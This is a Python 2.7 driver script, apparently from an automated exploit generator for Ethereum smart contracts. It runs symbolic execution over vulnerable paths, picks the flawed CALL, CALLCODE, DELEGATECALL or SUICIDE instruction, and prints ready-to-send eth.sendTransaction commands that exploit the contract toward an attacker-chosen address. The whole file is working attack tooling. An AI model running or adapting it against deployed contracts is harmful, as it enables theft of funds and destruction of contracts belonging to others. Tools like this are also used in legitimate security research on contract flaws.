#!/usr/bin/env python2.7
from binascii import hexlify

from combined_call_exploit import attempt_exploit_call, attempt_exploit_callcode, attempt_exploit_delegatecall, \
    attempt_exploit_suicide
from ethanalyze.evm import CombinedSymbolicResult
from ethanalyze.project import Project

INTERESTING_INS = ('CALL', 'CALLCODE', 'DELEGATECALL', 'SUICIDE', 'RETURN', 'STOP')

if __name__ == '__main__':
    import sys
    import json

    if len(sys.argv) < 3:
        print >> sys.stderr, "Usage: %s <project.json> <exploit.json>" % sys.argv[0]
        sys.exit(-1)

    with open(sys.argv[1]) as f:
        project_dict = json.load(f)

    p = Project.from_json(project_dict)

    with open(sys.argv[2]) as f:
        exploit_dict = json.load(f)

    combined = CombinedSymbolicResult()
    for path_dict in sorted(exploit_dict['paths'], key=lambda x: x['index'], reverse=True):
        # extend buggy paths...
        path = path_dict['path']
        last_ins = p.prg[path[-1]]
        bb = last_ins.bb
        idx = bb.ins.index(last_ins)
        for ins in bb.ins[idx:]:
            if ins.name in INTERESTING_INS:
                break
        if ins.addr != path[-1]:
            path.append(ins.addr)

        combined.prepend(p.run_symbolic(path_dict['path']))

    combined.simplify()

    vuln_ins = p.prg[combined.state.pc]

    target_addr = int(raw_input('Target Address: ').strip(), 16)

    result = None

    if vuln_ins.name == 'CALL':
        amount = raw_input('Target Amount: ').strip()
        amount_check = '+'
        if amount[0] in ('=', '+', '-'):
            amount_check = amount[0]
            amount = amount[1:]
        amount = int(amount)
        result = attempt_exploit_call(combined, target_addr, amount, amount_check)
    elif vuln_ins.name == 'CALLCODE':
        result = attempt_exploit_callcode(combined, target_addr)
    elif vuln_ins.name == 'DELEGATECALL':
        result = attempt_exploit_delegatecall(combined, target_addr)
    elif vuln_ins.name == 'SUICIDE':
        result = attempt_exploit_suicide(combined, target_addr)

    if result:
        call, r, model = result

        for i, res in enumerate(r.results):
            print '%d: %s' % (
            i, '->'.join('%x' % i for i in res.state.trace if i in p.cfg.bb_addrs or i == res.state.trace[-1]))
        print call
        print
        for c in call:
            print 'eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"%s})' % (
                target_addr, hexlify(c.get('payload', '')), ", value:%d" % c['value'] if c.get('value', 0) else '')
